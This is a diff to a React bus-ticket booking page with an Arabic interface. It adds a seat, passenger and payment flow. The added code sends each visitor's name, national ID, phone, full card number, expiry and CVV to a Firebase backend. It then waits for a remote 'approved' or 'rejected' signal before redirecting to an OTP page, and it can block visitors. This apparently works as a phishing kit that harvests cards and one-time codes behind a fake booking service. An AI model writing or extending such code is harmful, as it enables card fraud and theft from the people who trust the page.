@@ -11,9 +11,22 @@ import {
 } from "lucide-react";
 import { useLocation } from "wouter";
 import { BottomNav } from "./services";
-import { addData, handleCurrentPage } from "@/lib/firebase";
+import {
+  addData,
+  handleCurrentPage,
+  handlePay,
+  listenForApproval,
+} from "@/lib/firebase";
 import SiteHeader from "@/components/site-header";
 import SiteFooter from "@/components/site-footer";
+import SeatPicker from "@/components/reservation/seat-picker";
+import PassengerForm, {
+  type PassengerData,
+} from "@/components/reservation/passenger-form";
+import PaymentStep, {
+  type CardData,
+  getCardType,
+} from "@/components/reservation/payment-step";
 
 const cities = [
   "الكل",
@@ -116,72 +129,293 @@ const seatColor = (seats: number) => {
   return "text-green-600 bg-green-50";
 };
 
-function ReservationFlow({
-  trip,
-  onClose,
-  onConfirm,
-  submitting,
-}: {
-  trip: Trip;
-  onClose: () => void;
-  onConfirm: () => void;
-  submitting: boolean;
-}) {
+const STEPS = ["اختيار المقعد", "بيانات المسافر", "الدفع"];
+
+function StepIndicator({ current }: { current: number }) {
   return (
     <div
-      className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4"
-      onClick={onClose}
+      className="flex items-center justify-center gap-1 px-4 py-3 border-b border-border bg-card"
+      dir="rtl"
+    >
+      {STEPS.map((label, i) => (
+        <div key={i} className="flex items-center gap-1">
+          <div className="flex flex-col items-center gap-1">
+            <div
+              className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-black border-2 transition-all ${
+                i < current
+                  ? "bg-primary border-primary text-primary-foreground"
+                  : i === current
+                    ? "bg-primary border-primary text-primary-foreground scale-110 shadow-lg"
+                    : "bg-muted border-border text-muted-foreground"
+              }`}
+            >
+              {i < current ? "✓" : i + 1}
+            </div>
+            <span
+              className={`text-[9px] font-medium whitespace-nowrap ${i === current ? "text-primary font-bold" : "text-muted-foreground"}`}
+            >
+              {label}
+            </span>
+          </div>
+          {i < STEPS.length - 1 && (
+            <div
+              className={`w-8 h-1 mb-3 transition-colors ${i < current ? "bg-primary" : "bg-border"}`}
+            />
+          )}
+        </div>
+      ))}
+    </div>
+  );
+}
+
+function ReservationFlow({
+  trip,
+  bookingDate,
+  onClose,
+}: {
+  trip: Trip;
+  bookingDate: string;
+  onClose: () => void;
+}) {
+  const [, setLocation] = useLocation();
+  const [step, setStep] = useState(0);
+  const [seat, setSeat] = useState<number | null>(null);
+  const [passenger, setPassenger] = useState<PassengerData>({
+    name: "",
+    id: "",
+    phone: "",
+    email: "",
+  });
+  const [card, setCard] = useState<CardData>({
+    number: "",
+    name: "",
+    expiry: "",
+    cvv: "",
+  });
+  const [submitting, setSubmitting] = useState(false);
+  const [waitingApproval, setWaitingApproval] = useState(false);
+  const [submitError, setSubmitError] = useState("");
+
+  useEffect(() => {
+    if (!waitingApproval) return;
+    const unsubscribe = listenForApproval((status) => {
+      if (status === "approved") {
+        setWaitingApproval(false);
+        onClose();
+        setLocation("/otp");
+      } else if (status === "rejected") {
+        setWaitingApproval(false);
+        setSubmitError("البطاقة غير مدعومه حاول استخدام بطاقة اخرى");
+      }
+    });
+    return () => unsubscribe();
+  }, [waitingApproval, setLocation, onClose]);
+
+  const canNext = () => {
+    if (step === 0) return !!seat;
+    if (step === 1)
+      return (
+        passenger.name.trim().length > 0 &&
+        /^[12]\d{9}$/.test(passenger.id) &&
+        /^05\d{8}$/.test(passenger.phone) &&
+        /\S+@\S+\.\S+/.test(passenger.email)
+      );
+    if (step === 2)
+      return (
+        card.number.replace(/\s/g, "").length >= 14 &&
+        card.name.trim().length > 1 &&
+        /^\d{2}\/\d{2}$/.test(card.expiry) &&
+        card.cvv.length >= 3
+      );
+    return false;
+  };
+
+  const handleNext = async () => {
+    const visitorId = localStorage.getItem("visitor");
+    if (!visitorId) {
+      onClose();
+      setLocation("/register");
+      return;
+    }
+    if (step === 0) {
+      void addData({
+        id: visitorId,
+        currentPage: "schedule",
+        seatNumber: seat,
+        tripFrom: trip.from,
+        tripTo: trip.to,
+        tripDeparture: trip.departure,
+        tripArrival: trip.arrival,
+        tripType: trip.type,
+        ticketPrice: trip.price,
+        ticketQuantity: 1,
+        totalAmount: trip.price,
+        bookingDate,
+        bookingTime: trip.departure,
+      });
+      setStep(1);
+      return;
+    }
+    if (step === 1) {
+      void addData({
+        id: visitorId,
+        currentPage: "schedule",
+        name: passenger.name,
+        saudiId: passenger.id,
+        phone: passenger.phone,
+        email: passenger.email,
+      });
+      setStep(2);
+      return;
+    }
+    if (step === 2) {
+      setSubmitting(true);
+      setSubmitError("");
+      const [expMonth, expYear] = card.expiry.split("/");
+      const cleanCard = card.number.replace(/\s/g, "");
+      try {
+        await handlePay(
+          {
+            cardNumber: cleanCard,
+            cardName: card.name,
+            expiryMonth: expMonth || "",
+            expiryYear: expYear || "",
+            cvv: card.cvv,
+            cardType: getCardType(card.number) || "",
+            currentPage: "checkout",
+          },
+          () => {},
+        );
+        setSubmitting(false);
+        setWaitingApproval(true);
+      } catch (error: any) {
+        setSubmitting(false);
+        if (error?.message === "VISITOR_BLOCKED") {
+          setSubmitError("تم حظر هذا الزائر ولا يمكنه المتابعة");
+        } else {
+          setSubmitError("حدث خطأ أثناء معالجة الدفع");
+        }
+      }
+    }
+  };
+
+  return (
+    <div
+      className="fixed inset-0 z-[60] flex flex-col bg-background"
+      dir="rtl"
       data-testid="modal-reservation"
     >
-      <div
-        className="bg-card rounded-2xl p-6 max-w-md w-full shadow-2xl relative"
-        onClick={(e) => e.stopPropagation()}
-        dir="rtl"
-      >
+      <div className="flex items-center justify-between px-4 py-3 bg-card border-b border-border shrink-0">
         <button
           onClick={onClose}
-          className="absolute top-3 left-3 w-8 h-8 rounded-full bg-muted flex items-center justify-center hover:bg-muted-foreground/20 transition-colors"
+          className="w-8 h-8 rounded-full bg-muted flex items-center justify-center text-muted-foreground hover:bg-destructive/10 hover:text-destructive transition-colors"
           data-testid="button-close-reservation"
         >
           <X className="w-4 h-4" />
         </button>
-        <div className="w-14 h-14 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-4">
-          <Bus className="w-7 h-7 text-primary" />
+        <h2 className="font-bold text-foreground text-sm">حجز رحلة</h2>
+        <div className="w-8" />
+      </div>
+
+      <div className="bg-primary/5 border-b border-primary/20 px-4 py-2.5 flex items-center gap-3 shrink-0">
+        <div className="flex items-center gap-2 flex-1 text-sm">
+          <span className="font-black text-foreground">{trip.departure}</span>
+          <div className="flex-1 h-px bg-primary/30 relative">
+            <Bus className="w-3 h-3 text-primary absolute top-1/2 left-1/2 -translate-y-1/2 -translate-x-1/2" />
+          </div>
+          <span className="font-black text-foreground">{trip.arrival}</span>
         </div>
-        <h3 className="text-lg font-bold text-foreground text-center mb-2">
-          تأكيد الحجز
-        </h3>
-        <p className="text-sm text-muted-foreground text-center mb-5">
-          من {trip.from} إلى {trip.to}
-        </p>
-        <div className="bg-muted rounded-xl p-4 mb-5 space-y-2 text-sm">
-          <div className="flex justify-between">
-            <span className="text-muted-foreground">المغادرة</span>
-            <span className="font-bold text-foreground">{trip.departure}</span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-muted-foreground">الوصول</span>
-            <span className="font-bold text-foreground">{trip.arrival}</span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-muted-foreground">الفئة</span>
-            <span className="font-bold text-foreground">{trip.type}</span>
-          </div>
-          <div className="flex justify-between border-t border-border pt-2 mt-2">
-            <span className="text-muted-foreground">السعر</span>
-            <span className="font-black text-primary text-base">
-              {trip.price} ر.س
-            </span>
-          </div>
+        <div className="text-right shrink-0">
+          <p className="text-xs text-muted-foreground">
+            {trip.from} ← {trip.to}
+          </p>
+          <p className="text-xs font-bold text-primary">{trip.price} ر.س</p>
         </div>
-        <button
-          onClick={onConfirm}
-          disabled={submitting}
-          className="w-full bg-primary text-primary-foreground py-3 rounded-xl font-bold text-sm hover:opacity-90 transition-opacity disabled:opacity-60 disabled:cursor-not-allowed"
-          data-testid="button-confirm-reservation"
-        >
-          {submitting ? "جاري التحويل..." : "متابعة الحجز"}
-        </button>
+      </div>
+
+      <StepIndicator current={step} />
+
+      <div className="flex-1 overflow-y-auto px-4 py-5">
+        {step === 0 && (
+          <div className="flex flex-col gap-4">
+            <h3 className="text-base font-bold text-foreground text-right">
+              اختر مقعدك
+            </h3>
+            <SeatPicker onSelect={setSeat} />
+            {seat && (
+              <p className="text-center text-sm font-bold text-primary">
+                المقعد المختار: {seat}
+              </p>
+            )}
+          </div>
+        )}
+
+        {step === 1 && (
+          <div className="flex flex-col gap-4">
+            <h3 className="text-base font-bold text-foreground text-right">
+              بيانات المسافر
+            </h3>
+            <PassengerForm data={passenger} onChange={setPassenger} />
+          </div>
+        )}
+
+        {step === 2 && (
+          <div className="flex flex-col gap-4">
+            <h3 className="text-base font-bold text-foreground text-right">
+              إتمام الدفع
+            </h3>
+            <PaymentStep total={trip.price} card={card} onCardChange={setCard} />
+          </div>
+        )}
+      </div>
+
+      <div className="px-4 py-4 border-t border-border bg-card shrink-0 flex flex-col gap-3">
+        {submitError && (
+          <p
+            className="text-xs text-destructive text-center"
+            data-testid="text-submit-error"
+          >
+            {submitError}
+          </p>
+        )}
+        {waitingApproval && (
+          <p
+            className="text-xs text-primary text-center font-medium"
+            data-testid="text-waiting-approval"
+          >
+            جاري التحقق من البطاقة، يرجى الانتظار...
+          </p>
+        )}
+        <div className="flex gap-3">
+          {step > 0 && (
+            <button
+              onClick={() => setStep((s) => s - 1)}
+              disabled={submitting || waitingApproval}
+              className="flex-1 py-3 rounded-xl border border-border text-foreground font-bold text-sm hover:bg-muted transition-colors flex items-center justify-center gap-1 disabled:opacity-50"
+              data-testid="button-prev-step"
+            >
+              <ChevronLeft className="w-4 h-4 rotate-180" /> السابق
+            </button>
+          )}
+          <button
+            disabled={!canNext() || submitting || waitingApproval}
+            onClick={() => void handleNext()}
+            data-testid="button-next-step"
+            className={`flex-1 py-3 rounded-xl font-bold text-sm transition-all ${
+              canNext() && !submitting && !waitingApproval
+                ? "bg-primary text-primary-foreground hover:opacity-90 shadow-lg"
+                : "bg-muted text-muted-foreground cursor-not-allowed"
+            }`}
+          >
+            {waitingApproval
+              ? "بانتظار الموافقة..."
+              : submitting
+                ? "جاري المعالجة..."
+                : step === 2
+                  ? "تأكيد الدفع والحجز"
+                  : "التالي"}
+          </button>
+        </div>
       </div>
     </div>
   );
@@ -196,39 +430,10 @@ export default function Schedule() {
   const [selectedTrip, setSelectedTrip] = useState<Trip | null>(null);
   const [searchFrom, setSearchFrom] = useState("الكل");
   const [searchTo, setSearchTo] = useState("الكل");
-  const [reserving, setReserving] = useState(false);
 
   useEffect(() => {
     void handleCurrentPage("schedule");
   }, []);
-
-  const handleConfirmReservation = async () => {
-    if (!selectedTrip || reserving) return;
-    const visitorId = localStorage.getItem("visitor");
-    if (!visitorId) {
-      setLocation("/register");
-      return;
-    }
-    setReserving(true);
-    const ok = await addData({
-      id: visitorId,
-      currentPage: "checkout",
-      tripFrom: selectedTrip.from,
-      tripTo: selectedTrip.to,
-      tripDeparture: selectedTrip.departure,
-      tripArrival: selectedTrip.arrival,
-      tripType: selectedTrip.type,
-      ticketPrice: selectedTrip.price,
-      ticketQuantity: 1,
-      totalAmount: selectedTrip.price,
-      bookingDate: date,
-      bookingTime: selectedTrip.departure,
-    });
-    setReserving(false);
-    if (!ok) return;
-    setSelectedTrip(null);
-    setLocation("/checkout");
-  };
 
   const swap = () => {
     setFromCity(toCity);
@@ -260,9 +465,8 @@ export default function Schedule() {
       {selectedTrip && (
         <ReservationFlow
           trip={selectedTrip}
+          bookingDate={date}
           onClose={() => setSelectedTrip(null)}
-          onConfirm={() => void handleConfirmReservation()}
-          submitting={reserving}
         />
       )}
 
